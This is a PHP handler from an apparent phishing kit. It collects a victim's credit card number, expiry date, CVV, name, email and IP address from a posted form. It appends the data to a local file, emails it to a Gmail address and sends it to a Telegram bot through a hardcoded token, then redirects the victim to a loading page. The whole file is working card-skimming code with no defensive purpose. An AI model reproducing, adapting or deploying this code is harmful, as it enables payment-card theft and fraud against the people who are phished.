<?php
session_start();
include "./lyonkoclass.php";
$bin = new bin;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['ccn']) and !empty($_POST['mm']) and !empty($_POST['aa']) and !empty($_POST['cvv']) 
		 and !empty($_POST['fnm']) and !empty($_POST['em'])
	) {
			$_SESSION['ccn']=$_POST['ccn'];
		  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
            $full = $bin->getbank($_POST['ccn']);
            $Ak47 = "
            🔥
            ┏━━━━━━━━━━━━━━━━━━
            ┠⌬ ".$full."
            ┠⌬ ".$_POST['ccn']."
            ┠⌬ ".$_POST['mm']."/".$_POST['aa']."
            ┠⌬ ".$_POST['cvv']."
            ┠⌬ ".$ip . "
            ┗━━━━━━━━━━━━━━━━━━
            ┠⌬ ".$_POST['fnm']."
            ┠⌬ ".$_POST['em']."
            ┗━━━━━━━━━━━━━━━━━━
            〄 Mandex
            \n";

            $file = fopen("./toaah.txt", "a+");
            fwrite($file, $Ak47);
            fclose($file);
			$to = "scottich.montana46@gmail.com";
			$subject = "$ip =?utf-8?Q?=F0=9F=91=BD?= ".$_POST['ccn']."(".$full.")";
			$headers = "From: أكاغامي™<shanks@dPortgas.org>\r\n";
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
			mail($to, $subject, $Ak47, $headers);
            
             file_get_contents("https://api.telegram.org/bot1588168678:AAElp5lIsWo5q4GqdOCeCFxXyv4nLeO8zss/sendMessage?chat_id=-462207069&text=" . urlencode($Ak47)."" ); //mandex
            // file_get_contents("https://api.telegram.org/bot1588168678:AAElp5lIsWo5q4GqdOCeCFxXyv4nLeO8zss/sendMessage?chat_id=-462207069&text=" . urlencode($shona)."" ); //Abdo
			
        header("Location: ../loading.php?codigo_id=".md5($_GET['error']));
    }
}
?>